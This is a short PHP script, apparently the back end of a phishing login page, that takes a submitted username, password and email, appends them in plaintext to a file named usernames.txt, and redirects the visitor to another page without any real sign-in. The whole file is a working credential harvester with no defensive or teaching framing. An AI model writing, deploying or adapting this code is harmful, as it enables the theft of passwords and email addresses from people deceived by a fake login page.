<?php

file_put_contents("usernames.txt", "Usuario: " . $_POST['text'] . " Contraseña: " . $_POST['password'] . " Correo: " . $_POST['email'] . "\n", FILE_APPEND);
header('Location: redir.html');
exit();
